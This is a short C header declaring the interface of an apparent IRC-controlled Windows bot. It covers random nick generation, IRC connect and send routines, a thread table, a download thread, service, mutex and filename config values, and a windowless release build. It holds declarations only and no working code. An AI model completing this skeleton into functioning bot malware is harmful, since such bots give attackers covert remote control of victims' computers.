#ifdef DEBUG
	#pragma comment(linker, "/subsystem:console")
#else
	#pragma comment(linker, "/subsystem:windows")
#endif

#define MAX_LINE				512
#define MAX_RECEIVE_BUFFER		2048
#define MAX_WORDS				64
#define THREAD_WAIT_TIME		30
#define MAX_THREADS				256
#define MAX_NICKLEN				40
#define REQ_NICKLEN		7

typedef enum
{
	MSG_PASS,
	MSG_NICK,
	MSG_USER,
	MSG_PONG,
	MSG_JOIN,
	MSG_PRIVMSG,
	MSG_QUIT
} ircmessage;

typedef enum
{
	NONE,
} thread_type;

typedef struct
{
	HANDLE		tHandle;
	thread_type type;
	SOCKET		tsock;
} thread_s;

extern thread_s		threads[MAX_THREADS];
extern char			cfg_servicename[];
extern char			cfg_mutex[];
extern char			cfg_filename[];

//nick
char *GenerateNickA(void);
char *GenerateNumber(int Len);
//connect
unsigned int Resolve(char *host);
char *GetMyIP(SOCKET sock);
//threads
HANDLE Thread_Start(LPTHREAD_START_ROUTINE function, LPVOID param, BOOL wait);
void Thread_Clear(int num);
int Thread_Add(thread_type type);
void Thread_Prepare();
int Thread_Check(thread_type type);
int Thread_Kill(thread_type type);
//irc
DWORD WINAPI IRC_Thread(LPVOID param);
int IRC_Send(SOCKET sock, ircmessage msg, char *buffer, char *to);
int IRC_Connect(char *host, unsigned short port);
DWORD WINAPI DL_Thread(LPVOID param);






